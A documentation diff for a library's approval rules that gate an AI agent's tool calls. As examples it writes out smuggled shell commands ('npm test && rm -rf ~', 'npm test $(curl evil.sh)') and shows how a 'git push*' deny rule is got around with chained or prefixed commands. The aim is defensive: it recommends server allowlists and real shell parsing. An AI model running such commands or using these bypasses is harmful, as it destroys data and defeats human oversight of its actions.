@@ -2,7 +2,9 @@ Approval rules: what a person decided once, applied to the calls that follow. A 
 
 ### The patterns
 
-A pattern matches the whole argument. `*` matches any run of characters except shell operators: `;`, `&`, `|`, `` ` ``, `<`, `>`, `$(` and line breaks. So `npm test*` allows `npm test -- --watch`, but not `npm test && rm -rf ~` or `npm test $(curl evil.sh)`. `**` matches anything, operators included. `?` matches one character, and `\` makes the next one literal. Numbers and booleans match as text. Arrays, objects and missing arguments match no pattern.
+A pattern matches the whole argument, from its first character. `*` matches any run of characters except shell operators: `;`, `&`, `|`, `` ` ``, `<`, `>`, `$(` and line breaks. So `npm test*` allows `npm test -- --watch`, but not `npm test && rm -rf ~` or `npm test $(curl evil.sh)`. `**` matches anything, operators included. `?` matches one character, and `\` makes the next one literal. Numbers and booleans match as text. Arrays, objects and missing arguments match no pattern.
+
+Patterns are a convenience, not a sandbox. Matching from the first character keeps an allow rule narrow, and lets a command get around a deny rule: `git push*` denies `git push origin main`, but not `git status && git push`, `/usr/bin/git push` or `GIT_TRACE=1 git push`. `**git*push**` denies those too, and still misses other ways to write a push. To keep a shell tool from running what it shouldn't for other people, keep an allowlist on the server that denies the rest (`toToolApproval(allowed, { otherwise: 'denied' })` for that tool's calls), or check each command with a real shell parser, in a server rule's `when`.
 
 ### What it does
 
@@ -20,6 +22,8 @@ Session rules stay in memory until the page reloads or `clearSession()` runs. `a
 
 The same rules, as AI SDK 7's `toolApproval`: `streamText({ toolApproval: toToolApproval(rules) })` approves or denies a call a rule covers, and asks a person about the rest. The SDK checks it again on an approved call before running it, with edited arguments too. It runs edited arguments, which `setToolInput` puts in the messages, through the tool's schema first (and `experimental_refineToolInput`, when set), and runs only an edit that comes out unchanged: keep the fields the schema fills in, such as a zod `.default()` (the card starts an edit from the input it shows, defaults included), and use transforms that give the same result when run twice. Rules a client sends are the choices of the person using it, so apply them to that person's runs only. Keep rules that protect other people on the server.
 
+Keep the rules off a tool with no `execute`, such as a `review_changes` the page answers with a `DiffReview`: the review is the approval. A card for it has nothing to run. Approved, the call never gets a result: the review never shows, and recent AI SDK 7 releases end the run with `AI_MissingToolResultsError`. The routes below return `'not-applicable'` for it, and the rules decide the other tools.
+
 A call a rule decides carries a reason, which the approval keeps as `approval.reason`: by default "Allowed by a rule: …" or "Denied by a rule: …", with the rule in words. When the server's rules and the person's both decide, give each set its own `reason`, so the page can tell whose rule it was. The server's rules go first, and `otherwise: 'not-applicable'` hands the calls they don't cover to the person's:
 
 ```ts
@@ -33,6 +37,8 @@ const yours = toToolApproval(rules);
 streamText({
   // model, messages, tools…
   toolApproval: (options) => {
+    // No execute: the page answers it with a DiffReview, which is the approval.
+    if (options.toolCall.toolName === 'review_changes') return 'not-applicable';
     const decided = server(options);
     return decided === 'not-applicable' ? yours(options) : decided;
   },
@@ -64,6 +70,8 @@ const always = decisions.includes('allow-always')
   decisions={decisions}
   description={always ? `Always: ${always}` : undefined}
   labels={{ approvalCard: { resolved: { 'allow-always': always } } }}
+  // ACP's response has no field for a reason.
+  allowReason={false}
   // …
 />;
 ```
@@ -111,12 +119,14 @@ import { parseApprovalRules, toToolApproval } from 'signoff-ui/core';
 
 export async function POST(req: Request) {
   const { messages, rules }: { messages: UIMessage[]; rules?: unknown } = await req.json();
+  // This person's rules, for this person's run.
+  const yours = toToolApproval(parseApprovalRules(rules));
   const result = streamText({
     model,
     messages: await convertToModelMessages(messages, { tools }),
     tools,
-    // This person's rules, for this person's run.
-    toolApproval: toToolApproval(parseApprovalRules(rules)),
+    // Not on review_changes: it has no execute, and the page answers it.
+    toolApproval: (options) => (options.toolCall.toolName === 'review_changes' ? 'not-applicable' : yours(options)),
     stopWhen: stepCountIs(10),
   });
   return result.toUIMessageStreamResponse({ originalMessages: messages });
@@ -125,7 +135,7 @@ export async function POST(req: Request) {
 
 ### The server's rules win
 
-Rules the server keeps for everyone, such as one that denies `git push`, go first. Make them with `toToolApproval(SERVER_RULES, { otherwise: 'not-applicable' })`, and ask the person's `toToolApproval(parseApprovalRules(rules))` only when that returns `'not-applicable'`. A rule a client sends then can't approve a call the server's rules deny.
+Rules the server keeps for everyone, such as one that denies `git push`, go first. Make them with `toToolApproval(SERVER_RULES, { otherwise: 'not-applicable' })`, and ask the person's `toToolApproval(parseApprovalRules(rules))` only when that returns `'not-applicable'`. A rule a client sends then can't approve a call the server's rules deny. It can approve one their patterns miss, such as `git status && git push` past a `git push*` deny rule ([the patterns](/docs/components/use-approval-policy#the-patterns)): a rule that protects other people is an allowlist on the server, with `otherwise: 'denied'` for that tool's calls, or a check with a real shell parser.
 
 The route gets whatever the client sent, so `parseApprovalRules` checks it: each field and its type, at most 100 rules, 20 argument patterns in a rule, 500 characters in a string, and three `*` in a pattern, `**` counting as one. Matching takes time in proportion to the argument's length times the pattern's, whatever the number of `*`, so the 500-character limit is what bounds it. Other limits go in the second argument, such as `parseApprovalRules(rules, { maxWildcards: 1 })`. A rule that fails a check is left out.
 
